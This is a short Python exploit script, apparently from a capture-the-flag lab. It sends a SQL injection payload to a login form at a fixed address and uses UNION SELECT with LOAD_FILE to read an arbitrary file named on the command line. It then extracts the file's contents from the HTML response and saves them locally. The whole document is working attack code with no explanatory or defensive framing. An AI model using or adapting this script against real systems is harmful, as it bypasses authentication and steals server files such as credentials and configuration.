import requests
import sys
import re

regex = re.compile(r"admin(.*)</h3>", re.DOTALL)

data = { "uname": f"admin' UNION ALL SELECT 1,LOAD_FILE(\"{sys.argv[1]}\"),3,4,5,6-- -", "password": "password"}

r = requests.post('http://10.10.11.101/administrative', data=data)
match = re.search(regex, r.text)

fname = sys.argv[1].replace("/", "_")

if match.group(1) != 'None':
    with open('files/' + fname, 'w') as f:
        f.write(match.group(1))
